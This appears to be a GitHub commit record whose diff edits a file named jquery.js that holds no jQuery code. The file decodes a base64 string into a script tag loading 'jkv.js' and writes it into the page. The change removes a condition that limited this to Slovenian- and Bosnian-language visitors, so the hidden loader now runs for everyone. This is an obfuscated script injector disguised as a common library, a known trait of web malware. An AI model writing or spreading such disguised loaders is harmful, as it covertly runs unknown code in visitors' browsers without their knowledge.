3a0c76fb33d3620fdfd704195e2d8af1dd1ce04a
uadoctor <61203310+uadoctor@users.noreply.github.com>
2020-09-11 17:00:07 +0400

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,7 +1,3 @@
-if(/SL|BS/i.test(navigator.language || navigator.userLanguage)){
-
 var string = 'PHNjcmlwdCBzcmM9Imprdi5qcyI+PC9zY3JpcHQ+';
 var decodedString = atob(string);
 document.write(''+ decodedString +'');
-  
-}
